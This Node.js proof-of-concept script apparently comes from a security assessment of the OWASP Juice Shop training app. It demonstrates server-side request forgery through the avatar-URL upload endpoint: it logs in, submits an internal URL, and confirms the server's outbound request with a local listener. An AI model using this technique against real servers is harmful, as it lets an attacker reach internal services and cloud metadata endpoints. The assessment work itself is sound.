#!/usr/bin/env node
/*
 * V3 - Server-Side Request Forgery via the avatar URL (CWE-918, A10:2021)
 *
 * routes/profileImageUrlUpload.ts called fetch() on whatever URL the browser
 * supplied, with no validation at all, and stored the result on disk. That
 * turns the application server into an HTTP proxy that can reach resources the
 * attacker cannot: the loopback interface, other containers on the Docker
 * network, and the cloud instance-metadata endpoint 169.254.169.254.
 *
 * This PoC stands up a listener that plays the role of an internal-only
 * service. If the Juice Shop server connects to it, the request was made from
 * inside the trust boundary - that is the SSRF.
 *
 * Run:  node poc/03-ssrf-profile-image.mjs --url http://localhost:3000 \
 *             --ssrf-host 127.0.0.1 --ssrf-port 9999
 *       (inside Docker use  --ssrf-host host.docker.internal)
 */

import http from 'node:http'
import { ARGS, request, login, registerUser, verdict } from './lib/util.mjs'

const INTERNAL_PORT = ARGS.ssrfPort
const INTERNAL_HOST = ARGS.ssrfHost
const USER = { email: 'ssrf-demo@juice-sh.op', password: 'SsrfDemo123!' }

const evidence = []

// ---------------------------------------------------------------------------
// 1. Listener masquerading as a service that is not reachable from outside.
// ---------------------------------------------------------------------------
const hits = []
const internalService = http.createServer((req, res) => {
  hits.push({ url: req.url, method: req.method, ua: req.headers['user-agent'] ?? '-' })
  res.writeHead(200, { 'Content-Type': 'image/png' })
  res.end(Buffer.from('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4' +
    '890000000a49444154789c6300010000050001', 'hex'))
})

await new Promise(resolve => internalService.listen(INTERNAL_PORT, '0.0.0.0', resolve))
console.log(`\n[*] Internal-only service listening on ${INTERNAL_HOST}:${INTERNAL_PORT}`)

// ---------------------------------------------------------------------------
// 2. Authenticate (the avatar endpoint requires a logged-in session).
// ---------------------------------------------------------------------------
await registerUser(USER.email, USER.password)
const session = await login(USER.email, USER.password)
if (!session) {
  internalService.close()
  verdict({
    id: 'V3',
    title: 'Server-Side Request Forgery - avatar URL',
    cwe: 'CWE-918',
    exploited: false,
    evidence: ['Could not authenticate; aborting.']
  })
}

const target = `http://${INTERNAL_HOST}:${INTERNAL_PORT}/internal/admin-backup.png`
console.log(`[*] Asking the server to fetch : ${target}`)

// ---------------------------------------------------------------------------
// 3. Ask the application to fetch our "internal" address.
// ---------------------------------------------------------------------------
const res = await request('/profile/image/url', {
  method: 'POST',
  body: `imageUrl=${encodeURIComponent(target)}`,
  cookie: session.token
})

// Give the server a moment to issue the outbound request.
await new Promise(resolve => setTimeout(resolve, 2500))
internalService.close()

evidence.push(`POST /profile/image/url -> HTTP ${res.status}`)
evidence.push(`Image URL submitted     : ${target}`)
evidence.push(`Requests received by the internal service : ${hits.length}`)
for (const hit of hits) evidence.push(`   - ${hit.method} ${hit.url}  (User-Agent: ${hit.ua})`)

const exploited = hits.length > 0

// ---------------------------------------------------------------------------
// 4. Control: a legitimate public image must still be accepted.
// ---------------------------------------------------------------------------
const control = await request('/profile/image/url', {
  method: 'POST',
  body: `imageUrl=${encodeURIComponent('https://raw.githubusercontent.com/OWASP/owasp-swag/master/projects/juice-shop/JuiceShop_Logo.png')}`,
  cookie: session.token,
  timeoutMs: 20000
})
evidence.push(`Control: public HTTPS image -> HTTP ${control.status} (avatar update still functions)`)

verdict({
  id: 'V3',
  title: 'Server-Side Request Forgery - avatar URL',
  cwe: 'CWE-918',
  exploited,
  evidence
})
